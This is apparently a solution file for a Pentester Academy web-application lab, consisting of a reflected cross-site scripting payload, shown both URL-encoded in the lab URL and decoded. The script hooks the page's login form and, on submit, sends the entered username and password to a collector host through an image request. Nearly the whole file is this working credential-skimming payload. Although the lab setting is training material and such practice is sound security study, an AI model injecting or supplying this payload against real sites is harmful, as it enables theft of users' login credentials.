// http://pentesteracademylab.appspot.com/lab/webapp/jfp/3
// http://pentesteracademylab.appspot.com/lab/webapp/jfp/3?url=%3Cscript%3E%0Afunction%20InterceptForm()%20%7B%0A%20%20var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%20%20var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%20%20var%20w%3B%0A%0A%20%20new%20Image().src%20%3D%20(%22http%3A%2F%2Flocalhost%3A9000%2F%3Fusername%3D%22%20%2B%20username%20%2B%20%22%26password%3D%22%20%2B%20password)%3B%0A%20%20w%20%3D%20window.open(%27%27%2C%27%27%2C%27width%3D1%2Cheight%3D1%27)%3B%0A%20%20w.close()%3B%0A%7D%0A%0Adocument.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%0A%3C%2Fscript%3E

<script>
function InterceptForm() {
  var username = document.forms[0].elements[0].value;
  var password = document.forms[0].elements[1].value;
  var w;

  new Image().src = ("http://localhost:9000/?username=" + username + "&password=" + password);
  w = window.open('','','width=1,height=1');
  w.close();
}

document.forms[0].onsubmit = InterceptForm;

</script>
